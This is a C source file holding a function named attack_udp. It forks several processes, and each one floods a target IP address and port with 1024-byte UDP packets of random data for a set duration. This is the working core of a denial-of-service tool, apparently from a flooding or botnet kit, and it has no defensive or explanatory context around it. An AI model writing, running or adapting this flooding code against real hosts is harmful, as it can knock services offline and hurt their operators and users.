#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

void attack_udp(char *target, int port, int duration, int threads) {
    time_t end = time(NULL) + duration;

    for (int i = 0; i < threads; i++) {
        if (fork() == 0) {
            int sock = socket(AF_INET, SOCK_DGRAM, 0);
            struct sockaddr_in addr;
            addr.sin_family = AF_INET;
            addr.sin_port = htons(port);
            inet_pton(AF_INET, target, &addr.sin_addr);

            char packet[1024];
            while (time(NULL) < end) {
                memset(packet, rand() % 256, sizeof(packet));
                sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&addr, sizeof(addr));
            }
            close(sock);
            exit(0);
        }
    }
}